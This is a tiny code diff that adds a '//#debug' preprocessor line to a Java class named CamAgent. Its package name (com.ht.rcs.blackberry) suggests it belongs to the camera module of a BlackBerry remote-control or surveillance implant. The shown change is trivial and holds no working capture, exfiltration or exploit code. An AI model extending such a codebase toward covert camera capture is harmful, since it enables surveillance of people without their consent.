@@ -4,6 +4,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class CamAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("CamAgent", DebugLevel.VERBOSE);
 
     public CamAgent(boolean agentStatus) {
